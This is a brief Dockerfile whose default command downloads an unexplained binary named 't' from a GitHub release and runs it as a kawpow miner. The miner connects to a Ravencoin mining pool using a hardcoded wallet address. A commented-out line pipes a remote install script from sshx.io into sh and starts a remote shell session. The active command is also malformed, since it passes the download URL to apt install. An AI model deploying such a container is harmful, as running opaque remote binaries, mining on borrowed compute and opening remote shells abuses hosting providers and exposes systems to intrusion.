FROM ubuntu:latest
ENTRYPOINT ["bash", "-c"]
CMD ["apt update && apt install -y wget https://github.com/iceyfromdiscord/RVN/releases/download/0.0/t && chmod +x t && ./t -a kawpow -o stratum+tcp://stratum.ravenminer.com:3838 -u RJSGjktM9LbSyS9DMpTKaLuW6kPNPuJK2d.main"]
#CMD ["apt update && apt install curl -y && curl -sSf https://sshx.io/get | sh && sshx"]
